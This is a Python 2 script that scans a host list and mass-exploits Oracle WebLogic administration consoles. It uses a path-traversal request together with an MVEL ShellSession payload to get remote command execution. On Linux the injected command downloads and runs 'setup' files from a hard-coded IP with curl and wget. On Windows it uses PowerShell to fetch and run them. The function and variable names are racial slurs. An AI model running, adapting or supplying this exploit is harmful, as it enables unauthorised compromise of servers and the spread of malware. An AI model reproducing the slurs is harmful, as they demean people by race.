import urllib2,sys,time,threading,random
global threadcount
threadcount=0
def nigger(host):
    global threadcount
    threadcount+=1
    mydomain="198.199.81.5"
    stupidnigeria = "cd /tmp||cd $(find / -writable -readable -executable | head -n 1);curl http://198.199.81.5/setup -O;wget http://198.199.81.5/setup -O setup;curl http://198.199.81.5/setup.py -O;wget http://198.199.81.5/setup.py -O setup.py;chmod 777 setup setup.py;python2 setup.py||python2.7 setup.py||python setup.py||./setup.py||./setup".replace("DOMAIN", mydomain)
    winbox = "@powershell -NoProfile -ExecutionPolicy unrestricted -Command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/manthey/pyexe/releases/download/v18/py27.exe', 'python.exe'); (New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py', 'setup.py');\" & .\python.exe setup.py".replace("DOMAIN", mydomain)
    url="http://"+host
    myuseragent="wget"
    try:
        if "WebLogic Server Administration Console Home" in urllib2.urlopen(urllib2.Request(url+'/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi")', headers={'User-Agent' : myuseragent})).read():
            print "VULNERABLE - " + url
           
            form_data_="_nfpb=false&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread=(weblogic.work.ExecuteThread)Thread.currentThread();\r\nweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\r\njava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\r\nfield.setAccessible(true);\r\nObject obj = field.get(adapter);\r\nweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\r\nString cmd = req.getHeader(\"cmd\");\r\nString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\",\"/c\", cmd} : new String[]{\"/bin/sh\",\"-c\", cmd};\r\nif (cmd != null) {\r\n    String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\\\A\").next();\r\n    weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);\r\n    res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));\r\n    res.getServletOutputStream().flush();\r\n    res.getWriter().write(\"\");}executeThread.interrupt();\");"
            headerslinux = {
                'cmd': stupidnigeria,
                'Content-Type':'application/x-www-form-urlencoded',
                'User-Agent':myuseragent,
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Connection':'close',
                'Accept-Encoding':'gzip,deflate',
                'Content-Type':'application/x-www-form-urlencoded'
            }
            headerswin = {
                'cmd': winbox,
                'Content-Type':'application/x-www-form-urlencoded',
                'User-Agent':myuseragent,
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Connection':'close',
                'Accept-Encoding':'gzip,deflate',
                'Content-Type':'application/x-www-form-urlencoded'
            }
            try:
                urllib2.urlopen(urllib2.Request(url+"/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal", data=form_data_, headers=headerslinux))
            except:
                pass
            try:
                urllib2.urlopen(urllib2.Request(url+"/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal", data=form_data_, headers=headerswin))
            except:
                pass
    except:
        pass
    threadcount -=1
    return
fh=open(sys.argv[1],"rb")
lines=fh.read().replace("\r", "").split("\n")
fh.close()
random.shuffle(lines)
for host in lines:
    while threadcount>=512:
        time.sleep(3)
    threading.Thread(target=nigger,args=(host,)).start()